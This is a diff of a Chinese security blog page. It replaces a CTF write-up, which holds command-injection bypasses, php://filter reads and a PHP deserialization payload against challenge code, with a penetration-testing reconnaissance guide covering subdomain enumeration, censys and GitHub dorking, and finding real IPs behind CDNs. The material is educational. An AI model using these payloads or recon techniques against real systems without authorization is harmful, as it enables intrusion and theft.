@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Immerse In BUU Day1, Web,CTF,Misc,JS,Python">
+    <meta name="keywords" content="渗透测试之信息收集, Web,CTF,Misc,JS,Python">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Immerse In BUU Day1 | V1cuna&#39;s blog</title>
+    <title>渗透测试之信息收集 | V1cuna&#39;s blog</title>
     <link rel="icon" type="image/png" href="https://cdn.jsdelivr.net/gh/V1cuna/v1cuna.github.io/V1cuna.png">
 
     <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/V1cuna/v1cuna.github.io/libs/awesome/css/all.css">
@@ -308,12 +308,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/V1cuna/v1cuna.github.io/medias/featureimages/6.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/V1cuna/v1cuna.github.io/medias/featureimages/23.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Immerse In BUU Day1</h1>
+                    <h1 class="description center-align post-title">渗透测试之信息收集</h1>
                 </div>
             </div>
         </div>
@@ -430,16 +430,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/CTF/">
-                                <span class="chip bg-color">CTF</span>
-                            </a>
-                        
-                            <a href="/tags/WP/">
-                                <span class="chip bg-color">WP</span>
-                            </a>
-                        
-                            <a href="/tags/BUU/">
-                                <span class="chip bg-color">BUU</span>
+                            <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+                                <span class="chip bg-color">渗透测试</span>
                             </a>
                         
                     </div>
@@ -454,7 +446,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-05-04
+                    2020-06-03
                 </div>
                 
 
@@ -463,7 +455,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.3k
+                    1.8k
                 </div>
                 
 
@@ -480,137 +472,63 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>刚弄好新博客，慢慢来刷题了。</p>
-<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p>命令注入，<code>?ip=127.0.0.1|ls</code>发现存在flag.php和index.php,cat的时候发现各种口吐芬芳，手动fuzz了一下发现ban掉了flag的贪婪匹配，bash，空格。</p>
-<p>index.php里应该有源码，问题在于绕过空格过滤。</p>
-<h3 id="绕过空格过滤："><a href="#绕过空格过滤：" class="headerlink" title="绕过空格过滤："></a>绕过空格过滤：</h3><ul>
-<li><p>[:space:]    不行，[]被过滤</p>
-</li>
-<li><p>cat&lt;&gt;/index  不行，/&lt;&gt;均被过滤</p>
-</li>
-<li><p><code>$IFS$1</code>：可以</p>
-<pre><code class="shell">payload:?ip=1|cat$IFS$1index.php</code></pre>
-<p><a href="https://www.jianshu.com/p/6e09a0996d9c" target="_blank" rel="noopener">关于【shell】IFS和$*变量:</a></p>
-</li>
-</ul>
-<p>一般来说的形式有：</p>
-<pre><code class="shell">cat$IFS$1/flag
-cat${IFS}/flag
-cat$IFS/flag</code></pre>
-<p>  另外补充一下Linux中各种变量的的意思</p>
-<pre><code class="shell">$# 是传给脚本的参数个数
-$0 是脚本本身的名字
-$1 是传递给该shell脚本的第一个参数
-$2 是传递给该shell脚本的第二个参数
-$@ 是传给脚本的所有参数的列表
-$* 是以一个单字符串显示所有向脚本传递的参数，与位置变量不同，参数可超过9个
-$$ 是脚本运行的当前进程ID号
-$? 是显示最后命令的退出状态，0表示没有错误，其他表示有错误</code></pre>
-<pre><code>/?ip=
-|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
-    echo preg_match("/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{20}]|\&gt;|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
-    die("fxck your symbol!");
-  } else if(preg_match("/ /", $ip)){
-    die("fxck your space!");
-  } else if(preg_match("/bash/", $ip)){
-    die("fxck your bash!");
-  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
-    die("fxck your flag!");
-  }
-  $a = shell_exec("ping -c 4 ".$ip);
-  echo "
-
-";
-  print_r($a);
-}
-
-?&gt;
-</code></pre><p>看到源码，下一步是bypass 过滤的flag字符串。</p>
-<h3 id="绕过flag过滤"><a href="#绕过flag过滤" class="headerlink" title="绕过flag过滤"></a>绕过flag过滤</h3><h4 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h4><p>这里注意到有一个$a可以覆盖，联想到之前拆一句话小马的做法：</p>
-<pre><code class="shell">payload：?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</code></pre>
-<h4 id="其他的payload："><a href="#其他的payload：" class="headerlink" title="其他的payload："></a>其他的payload：</h4><pre><code class="shell">?ip=1;echo$IFS$1Y2F0IGZsYWcucGhwCg==|base64$IFS$1-d|sh   #base64+sh（bash被过滤了）
-?ip=127.0.0.1;cat$IFS$9`ls` #反引号内联执行</code></pre>
-<h4 id="这里说一下反引号内联："><a href="#这里说一下反引号内联：" class="headerlink" title="这里说一下反引号内联："></a>这里说一下反引号内联：</h4><p>命令替代，大部分<code>Unix shell</code>以及编程语言如<code>Perl</code>、<code>PHP</code>以及<code>Ruby</code>等都以成对的重音符(反引号)作指令替代，意思是以某一个指令的输出结果作为另一个指令的输入项。例如以下指令:</p>
-<pre><code class="shell">
-echo It is now `date` 
-等价于：
-echo It is now 一 5月 5 05:16:04 GMT 2020
-在正式执行时会产生以下输出结果：
-It is now 一 5月 5 05:16:04 GMT 2020</code></pre>
-<h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p>点击tips发现url变成了：<code>buuoj.cn/?file=flag.php</code>，flag应该是被注释掉了。伪协议读取即可。</p>
-<pre><code>?file=php://filter/convert.base64-encode/resource=flag.php</code></pre><h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p>打开题目，给出源码。</p>
-<pre><code class="php"> &lt;?php  
-$text = $_GET["text"];
-$file = $_GET["file"];
-$password = $_GET["password"];
-if(isset($text)&amp;&amp;(file_get_contents($text,'r')==="welcome to the zjctf")){
-    echo "&lt;br&gt;&lt;h1&gt;".file_get_contents($text,'r')."&lt;/h1&gt;&lt;/br&gt;";
-    if(preg_match("/flag/",$file)){
-        echo "Not now!";
-        exit(); 
-    }else{
-        include($file);  //useless.php
-        $password = unserialize($password);
-        echo $password;
-    }
-}
-else{
-    highlight_file(__FILE__);
-}
-?&gt; </code></pre>
-<p><strong>第一个绕过：</strong></p>
-<pre><code>if(isset($text)&amp;&amp;(file_get_contents($text,'r')==="welcome to the zjctf"))</code></pre><p>这里需要我们传入一个文件且其内容为welcome to the  zjctf，这样的话往后面看没有其他可以利用的点，我们就无法写入文件再读取，就剩下了一个data伪协议。data协议通常是用来执行PHP代码，然而我们也可以将内容写入data协议中然后让file_get_contents函数取读取。构造如下：</p>
-<pre><code>text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</code></pre><p>当然也可以不需要base64，但是一般为了绕过某些过滤都会用到base64。data://text/plain,welcome to the zjctf</p>
-<p><strong>第二个绕过</strong></p>
-<pre><code>$file = $_GET["file"];
-if(preg_match("/flag/",$file)){
-        echo "Not now!";
-        exit(); 
-    }else{
-        include($file);  //useless.php
-        $password = unserialize($password);
-        echo $password;
-    }</code></pre><p>这里有file参数可控，但是无法直接读取flag，可以直接读取/etc/passwd，但针对php文件我们需要进行base64编码，否则读取不到其内容，所以以下无法使用：</p>
-<pre><code>file=useless.php</code></pre><p>所以下面采用filter来读源码，但上面提到过针对php文件需要base64编码，所以使用其自带的base64过滤器。</p>
-<pre><code>php://filter/read=convert.base64-encode/resource=useless.php</code></pre><p>读到的useless.php内容如下：</p>
-<pre><code>&lt;?php  
-class Flag{  //flag.php  
-    public $file;  
-    public function __tostring(){  
-        if(isset($this-&gt;file)){  
-            echo file_get_contents($this-&gt;file); 
-            echo "&lt;br&gt;";
-        return ("U R SO CLOSE !///COME ON PLZ");
-        }  
-    }  
-}  
-?&gt;</code></pre><p><strong>第三个绕过</strong></p>
-<pre><code>$password = $_GET["password"];
-include($file);  //useless.php
-$password = unserialize($password);
-echo $password;</code></pre><p>这里的file是我们可控的，所以在本地测试后有执行下面代码即可出现payload：</p>
-<pre><code>&lt;?php  
-class Flag{  //flag.php  
-    public $file="flag.php";  
-    public function __tostring(){  
-        if(isset($this-&gt;file)){  
-            echo file_get_contents($this-&gt;file); 
-            echo "&lt;br&gt;";
-        return ("U R SO CLOSE !///COME ON PLZ");
-        }  
-    }  
-}  
-$a = new Flag();
-echo serialize($a);
-?&gt;
-//O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}</code></pre><p>最后payload</p>
-<pre><code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:%22Flag%22:1:%7Bs:4:%22file%22;s:8:%22flag.php%22;%7D</code></pre><h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><p>一个买东西的功能，尝试买一下最贵的。</p>
-<p>输入 id：4           price：1337</p>
-<p>回显：Only one char(?) allowed!</p>
-<p>结合题目unicorn，应该是利用了Unicode的等价性。</p>
-<p>可以在这个网站上直接查询<a href="https://www.compart.com/en/unicode/U+2031" target="_blank" rel="noopener">https://www.compart.com/en/unicode/U+2031</a></p>
-<p>关于Unicode的知识，详见wiki</p>
-<p><a href="https://zh.wikipedia.org/wiki/Unicode等價性" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/Unicode%E7%AD%89%E5%83%B9%E6%80%A7</a></p>
+                <p>一般来说，我个人渗透测试时进行渗透测试的思路是这样的：</p>
+<ol>
+<li>服务器的相关信息（真实ip，系统类型，版本，开放端口，WAF等）</li>
+<li>网站指纹识别（包括，cms，cdn，证书等），dns记录</li>
+<li>whois信息，姓名，备案，邮箱，电话反查（邮箱丢社工库，社工准备等）</li>
+<li>子域名收集，旁站，C段等</li>
+<li>google hacking针对化搜索，中间件版本，弱口令扫描等</li>
+<li>扫描网站目录结构，爆后台 ，网站banner，测试文件，备份等敏感文件泄漏等</li>
+<li>传输协议，通用漏洞，exp，github源码等</li>
+</ol>
+<h1 id="域名收集"><a href="#域名收集" class="headerlink" title="域名收集"></a>域名收集</h1><h2 id="1-基于ssl证书查询"><a href="#1-基于ssl证书查询" class="headerlink" title="1.基于ssl证书查询"></a>1.基于ssl证书查询</h2><p>以<a href="https://censys.io举例基于ssl证书查询的域名搜集" target="_blank" rel="noopener">https://censys.io举例基于ssl证书查询的域名搜集</a></p>
+<p>以阿里巴巴来举例好了, 已知域名 <a href="http://www.1688.com" target="_blank" rel="noopener">www.1688.com</a></p>
+<p>去除子域名www, 搜索剩余部分</p>
+<p>第一个就可以, 虽然是404但是没有关系, 只要是https站点就可以.</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2019/png/179487/1550553174364-f3d05192-5838-48a4-8d7b-9739bc86283b.png" alt="image.png"></p>
+<p>查看详细信息, 再查看详细信息中找到 Certificate Chain 这里我看到了两个,我不太清楚两个的区别和关系, 我都看了一遍, 其中一个就有<a href="https://censys.io/certificates/e9e40947b03f1bf5a5f030fa6f2f823cfcbac9be0a033c154f17337d23325b9d" target="_blank" rel="noopener">详细的域名信息</a></p>
+<h2 id="2-第三方网站接口查询"><a href="#2-第三方网站接口查询" class="headerlink" title="2.第三方网站接口查询"></a>2.第三方网站接口查询</h2><p>第三方网站接口查询实际上比较宽泛, 甚至包裹了第一点,</p>
+<p>可以用 censys.io 来举例</p>
+<h3 id="censys-io查询语法"><a href="#censys-io查询语法" class="headerlink" title="censys.io查询语法"></a>censys.io查询语法</h3><p>Censys默认执行全文搜索。例如，搜索 <a href="https://censys.io/ipv4?q=Dell" target="_blank" rel="noopener">Dell</a>将查找记录中出现戴尔一词的任何主机 - 它不会将搜索限制为戴尔制造的设备。但是，可以使用以下语法查询特定字段：</p>
+<h5 id="指定字段"><a href="#指定字段" class="headerlink" title="指定字段"></a>指定字段</h5><p>Censys记录是结构化的，允许查询特定字段。例如，您可以使用以下查询搜索具有特定HTTP状态代码的所有主机：[80.http.get.status_code: 200](<a href="https://censys.io/ipv4?q=80.http.get.status_code%3A" target="_blank" rel="noopener">https://censys.io/ipv4?q=80.http.get.status_code%3A</a> 200)。您可以在“数据定义”选项卡下查看已定义字段的列表，也可以查看主机的详细信息。例如，以下是Censys Web服务器<a href="https://censys.io/ipv4/72.14.246.220/table" target="_blank" rel="noopener">的字段</a>。</p>
+<h5 id="布尔逻辑"><a href="#布尔逻辑" class="headerlink" title="布尔逻辑"></a>布尔逻辑</h5><p>您可以撰写使用术语多个语句and， or，not，和括号。例如，[(“Schneider Electric” or Dell) and 23.20.0.0/14](<a href="https://censys.io/ipv4?q=" target="_blank" rel="noopener">https://censys.io/ipv4?q=</a>(“Schneider Electric” or Dell) and 23.20.0.0%2F14)。默认情况下，所有包含的术语都是可选的（即作为or 语句执行）。</p>
+<h5 id="网络，主机名和协议"><a href="#网络，主机名和协议" class="headerlink" title="网络，主机名和协议"></a>网络，主机名和协议</h5><p>您可以使用CIDR表示法（例如，<a href="https://censys.io/ipv4?q=23.20.0.0%2F14" target="_blank" rel="noopener">ip:23.20.0.0/14</a>）或通过指定地址范围来搜索IP 地址： [ip:[23.20.0.0 TO 23.20.5.34]](<a href="https://censys.io/ipv4?q=ip%3A[23.20.0.0" target="_blank" rel="noopener">https://censys.io/ipv4?q=ip%3A[23.20.0.0</a> TO 23.20.5.34])。您可以通过搜索协议字段来搜索为特定协议提供服务的主机，例如， <a href="https://censys.io/ipv4?q=protocols%3A" target="_blank" rel="noopener" title="102%2Fs7">protocols: “102/s7”</a>。</p>
+<p>可以使用以下语法进行内联DNS查询：<a href="https://censys.io/ipv4?q=a%3Afacebook.com" target="_blank" rel="noopener">a:facebook.com</a>和<a href="https://censys.io/ipv4?q=mx%3Agmail.com" target="_blank" rel="noopener">mx:gmail.com</a>。</p>
+<h5 id="范围"><a href="#范围" class="headerlink" title="范围"></a>范围</h5><p>您可以搜索使用数字的范围[和] 包容性的范围和{和}独家范围。例如，80.http.get.status_code:[200 TO 300]。日期应使用以下语法格式化：[2012-01-01 TO 2012-12-31]。也可以指定单侧限制： [2012-01-01 TO *]。警告！ 该TO关键字必须大写。</p>
+<h5 id="通配符和正则表达式"><a href="#通配符和正则表达式" class="headerlink" title="通配符和正则表达式"></a>通配符和正则表达式</h5><p>Censys默认搜索完整的单词。换句话说，搜索 Del不会返回包含该单词的记录Dell。通配符搜索可以在单个术语上运行，?用于替换单个字符，以及<em>替换零个或多个字符。例如，如果要搜索以Del开头的单词，则可以搜索Del</em>。</p>
+<p>您也可以使用正则表达式进行搜索，例如 metadata.manufacturer:/De[ll]/。完整的正则表达式语法<a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/query-dsl-regexp-query.html#regexp-syntax" target="_blank" rel="noopener">可在此处获得</a>。</p>
+<h5 id="提高相关度优先级"><a href="#提高相关度优先级" class="headerlink" title="提高相关度优先级"></a>提高相关度优先级</h5><p>boost运算符（^）可用于使一个术语比另一个术语更相关。例如， metadata.manufacturer: Dell^2 OR “Schneider Electric”更偏向于Dell关键字。</p>
+<h5 id="保留字符"><a href="#保留字符" class="headerlink" title="保留字符"></a>保留字符</h5><p>必须使用反斜杠转义以下字符： + - = &amp; || &gt; &lt; ! ( ) { } [ ] ^ “ ~ * ? : \ /。</p>
+<h3 id="搜索引擎搜索"><a href="#搜索引擎搜索" class="headerlink" title="搜索引擎搜索"></a>搜索引擎搜索</h3><p>搜索引擎的高级语法同样可以帮助收集子域名和域名</p>
+<p>例如 <code>inurl:baidu.com</code> 直接复制进搜索框, 除了推广之外剩下都是baidu.com为主域名的网站, 但是同样的条件下搜索引擎一般不如专门的信息收集平台(废话).</p>
+<p>但是搜索引擎也有一些刁钻的用法, 例如搜素一下一个平台中所有的pdf, 或者所有的doc, 一般不会有什么特别的, 但是在一些新业务中有可能会将开发文档加一个很长的名字放在网站底下, 但是谷歌还是可以搜索到, 相比起来百度就差很多,所以使用搜索引擎进行信息收集时不建议使用百度.</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2019/png/179487/1550557248734-8fbfb277-2c9c-4844-b566-1056e4230c14.png" alt="image.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2019/png/179487/1550557284244-db99e02d-7fbf-4e4b-a5a2-105cd9f5c43e.png" alt="image.png"></p>
+<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="3-Github查询"><a href="#3-Github查询" class="headerlink" title="3.Github查询"></a>3.Github查询</h2><p>在github查询时思路需要灵活, 例如渗透的目标叫做 “XX”</p>
+<p>如果在GitHub死板的搜索 “XX” 收获并不会很大, 可以加上一些和开发相关的关键字</p>
+<p>例如: ”XX 开发“ “XX 手册” “XX 项目” “XX 密码” “XX 用户”</p>
+<p>也可以收集相关的域名去github搜索</p>
+<p>例如: “xxx.com”</p>
+<p>搜索时可以使用“”xxx.com”” 来强制匹配一些关键字, 可以使用size关键字限制文件大小</p>
+<p>例如: “XXX.com size&lt;1000”</p>
+<h2 id="4-域传送漏洞"><a href="#4-域传送漏洞" class="headerlink" title="4.域传送漏洞"></a>4.域传送漏洞</h2><p>参考: <a href="http://www.lijiejie.com/dns-zone-transfer-1/" target="_blank" rel="noopener">http://www.lijiejie.com/dns-zone-transfer-1/</a></p>
+<h2 id="5-子域名枚举"><a href="#5-子域名枚举" class="headerlink" title="5.子域名枚举"></a>5.子域名枚举</h2><p>一个一个判断这个子域名是否存在, 脚本可以自己写, 也可以用下面这些工具</p>
+<h2 id="1-相关工具"><a href="#1-相关工具" class="headerlink" title="-1.相关工具"></a>-1.相关工具</h2><p><a href="https://github.com/cL0und/helloWebScan" target="_blank" rel="noopener">helloWebScan</a> cL0und大牛编写的信息收集脚本</p>
+<p><a href="https://github.com/aboul3la/Sublist3r" target="_blank" rel="noopener">Sublist3r</a> 使用各种资源查找子域名, 包括搜索引擎和一些信息收集平台</p>
+<p><a href="http://www.webscan.cc/api/" target="_blank" rel="noopener">http://www.webscan.cc/api/</a> 获取iP地址对应的域名，查询服务器IP上有多少个绑定域名</p>
+<p><a href="https://github.com/0xbug/orangescan" target="_blank" rel="noopener">orangescan</a> 看起来还不错的在线信息收集平台</p>
+<p><a href="https://github.com/bit4woo/teemo" target="_blank" rel="noopener">teemo</a> 域名收集和枚举的工具</p>
+<h1 id="CDN绕过"><a href="#CDN绕过" class="headerlink" title="CDN绕过"></a>CDN绕过</h1><h2 id="1-查询DNS解析记录"><a href="#1-查询DNS解析记录" class="headerlink" title="1.查询DNS解析记录"></a>1.查询DNS解析记录</h2><p>这个域名可能以前只想过真实的ip, 后面才上的CDN, 那么通过域名解析记录就可以知道真实ip地址</p>
+<p><a href="https://toolbar.netcraft.com/site_report?url=baidu.com" target="_blank" rel="noopener">https://toolbar.netcraft.com/site_report?url=baidu.com</a></p>
+<h2 id="2-通过服务器发送的电子邮件"><a href="#2-通过服务器发送的电子邮件" class="headerlink" title="2.通过服务器发送的电子邮件"></a>2.通过服务器发送的电子邮件</h2><p>服务器发送的电子邮件源码中会包含发送服务器的ip信息</p>
+<p>例如注册或者修改密码时的验证邮件可能来自于真实服务器</p>
+<h2 id="3-通过子域名"><a href="#3-通过子域名" class="headerlink" title="3.通过子域名"></a>3.通过子域名</h2><p>如果子域名没有CDN那么</p>
+<p>1.通过枚举子域名对应IP所在的C段,</p>
+<p>2.通过<a href="http://ipwhois.cnnic.cn/index.jsp来获取对应ip的网络名称再通过网络名称获取ip段" target="_blank" rel="noopener">http://ipwhois.cnnic.cn/index.jsp来获取对应ip的网络名称再通过网络名称获取ip段</a>, 再枚举ip段中的所有ip</p>
+<h1 id="4-通过页面特征"><a href="#4-通过页面特征" class="headerlink" title="4.通过页面特征"></a>4.通过页面特征</h1><p>如title等页面中存在的特征在fofa, shodan上面通过对应特征搜索</p>
+<p>IP段扫描:</p>
+<p>Python+Masscan(端口扫描)+ Nmap(端口识别)</p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -654,7 +572,7 @@ echo serialize($a);
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://hackyangtuo.top/posts/ab7.html">https://hackyangtuo.top/posts/ab7.html</a>
+                    <a href="https://hackyangtuo.top/posts/b930.html">https://hackyangtuo.top/posts/b930.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -692,16 +610,8 @@ echo serialize($a);
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/CTF/">
-                                    <span class="chip bg-color">CTF</span>
-                                </a>
-                            
-                                <a href="/tags/WP/">
-                                    <span class="chip bg-color">WP</span>
-                                </a>
-                            
-                                <a href="/tags/BUU/">
-                                    <span class="chip bg-color">BUU</span>
+                                <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+                                    <span class="chip bg-color">渗透测试</span>
                                 </a>
                             
                         </div>
@@ -747,32 +657,27 @@ echo serialize($a);
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/posts/1527.html">
+                <a href="/posts/73b4.html">
                     <div class="card-image">
                         
                         
-                        <img src="https://cdn.jsdelivr.net/gh/V1cuna/v1cuna.github.io/medias/featureimages/17.jpg" class="responsive-img" alt="Mysql注入">
+                        <img src="https://cdn.jsdelivr.net/gh/V1cuna/v1cuna.github.io/medias/featureimages/13.jpg" class="responsive-img" alt="python脚本收编写">
                         
-                        <span class="card-title">Mysql注入</span>
+                        <span class="card-title">python脚本收编写</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            Mysql注入进阶Written by ttpfx
-Added by M0nkey、V1cuna
-1.常见过滤手段的Bypass
-
-and/or的过滤/拦截
-空格被过滤/拦截
-括号被过滤/拦截
-逗号被过滤/拦截
-information_sc
+                            fuzz测试#! -*- encoding:utf-8 -*-
+# python3
+import requests
+fuzz_zs = ['/*', '*/', '/*!', '*', '=', '`', '!', '@', '%', '.
                         
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-05-04
+                            <i class="far fa-clock fa-fw icon-date"></i>2020-06-07
                         </span>
                         <span class="publish-author">
                             
@@ -785,12 +690,8 @@ information_sc
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/SQL-injection/">
-                        <span class="chip bg-color">SQL injection</span>
-                    </a>
-                    
-                    <a href="/tags/Summary/">
-                        <span class="chip bg-color">Summary</span>
+                    <a href="/tags/python/">
+                        <span class="chip bg-color">-python</span>
                     </a>
                     
                 </div>
@@ -804,24 +705,26 @@ information_sc
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/posts/c1a1.html">
+                <a href="/posts/ccdc.html">
                     <div class="card-image">
                         
                         
-                        <img src="https://cdn.jsdelivr.net/gh/V1cuna/v1cuna.github.io/medias/featureimages/23.jpg" class="responsive-img" alt="学习python反序列化">
+                        <img src="https://cdn.jsdelivr.net/gh/V1cuna/v1cuna.github.io/medias/featureimages/23.jpg" class="responsive-img" alt="immerse in BUU day2">
                         
-                        <span class="card-title">学习python反序列化</span>
+                        <span class="card-title">immerse in BUU day2</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            0X01:Pickle是干什么用的：序列化、反序列化　　在很多任务中，我们可能会需要把一些内容存储起来，以备后续利用。如果我们要存储的内容只是一条字符串或是数字，那么我们只需要把它写进文件就行。然而，如果我们需要存储的东西是一个dict、一
+                            [CISCN2019 华北赛区 Day1 Web2]ikun知识点：逻辑漏洞，cookie伪造，python反序列化
+登陆后是一个商城界面，发现视频下面写了：==爆破*站：资金募集 11540.0==
+==ikun们冲鸭,一定要买到lv6!
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-05-02
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-05-29
                             </span>
                         <span class="publish-author">
                             
@@ -834,8 +737,16 @@ information_sc
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%80%BB%E7%BB%93/">
-                        <span class="chip bg-color">-python反序列化 -总结</span>
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
+                    </a>
+                    
+                    <a href="/tags/WP/">
+                        <span class="chip bg-color">WP</span>
+                    </a>
+                    
+                    <a href="/tags/BUU/">
+                        <span class="chip bg-color">BUU</span>
                     </a>
                     
                 </div>
